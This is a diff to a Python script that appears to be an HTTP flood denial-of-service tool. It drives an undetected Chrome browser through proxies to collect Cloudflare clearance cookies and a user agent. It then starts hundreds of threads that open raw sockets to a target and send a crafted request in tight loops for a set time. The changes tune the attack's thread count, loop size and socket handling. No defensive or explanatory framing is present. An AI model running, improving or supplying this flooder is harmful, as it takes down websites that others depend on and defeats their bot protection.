@@ -1,5 +1,5 @@
 import requests
-
+from selenium import webdriver
 import undetected_chromedriver as uc
 import ssl
 import threading
@@ -46,23 +46,29 @@ def browser(url,proxy):
     if proxyWork == True:
         options.add_argument(f'--proxy-server={proxy}')
     options.add_argument('--allow-running-insecure-content')
+
+
     driver = uc.Chrome(options=options)
-    driver.get(url)
-    sleep(10)
-    cookies = driver.get_cookies()
-    agent = driver.execute_script("return navigator.userAgent")
+    driver.set_page_load_timeout(10)
+    try:
+        driver.get(url)
+        sleep(10)
+        cookies = driver.get_cookies()
+        agent = driver.execute_script("return navigator.userAgent")
+        sleep(2)
+    except:
+        pass
     driver.close()
     cookiesForScript = {}
     print(cookies, agent)
+
     for cookie in cookies:
         cookiesForScript[cookie['name']] = cookie['value']
     return cookiesForScript, agent
 
 
 
-def method(proxy,cfcookie,proxyWork,agent,url,timer):
-    start_time = time.time()
-    end_time = time.time()
+def method(proxy,cfcookie,proxyWork,agent,url):
     while not stop_threads:
         try:
             target = get_target(url)
@@ -105,10 +111,8 @@ def method(proxy,cfcookie,proxyWork,agent,url,timer):
                 packet.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 packet.connect((str(target['host']), int(target['port'])))
 
-            num = 0
 
-            for _ in range(1000000):
-                num += 1
+            for _ in range(1000):
                 packet.send(str.encode(req))
                 #print(num)
                 #response = packet.recv(1024)
@@ -116,14 +120,14 @@ def method(proxy,cfcookie,proxyWork,agent,url,timer):
 
 
             #response = packet.recv(1024)
-            #packet.close()
+            packet.close()
             #print(response.decode(encoding='latin-1'))
         except:
             pass
 
 target = sys.argv[1]
 timer = int(sys.argv[2])
-threadsnum = 1000
+threadsnum = 300
 
 if __name__ == '__main__':
     #parseandsaveproxy()
@@ -137,15 +141,17 @@ if __name__ == '__main__':
             #proxy = '77.90.158.11:50697'
             #print(proxies[0])
             cfcookie, agent = browser(target, proxy)
+            print(cfcookie)
             if cfcookie == {} or cfcookie == []:
                 pass
             else:
                 break
         except Exception as e:
             print(e)
-    sleep(1)
+
+    print('Start !')
     for i in range(threadsnum):
-        threading.Thread(target=method, args=(proxy,cfcookie,proxyWork,agent,target,timer,)).start()
+        threading.Thread(target=method, args=(proxy,cfcookie,proxyWork,agent,target,)).start()
 
     start_time = time.time()
     end_time = time.time()
@@ -157,5 +163,4 @@ if __name__ == '__main__':
     print('Start stop threads')
     terminate_threads()
     print('Done')
-
 
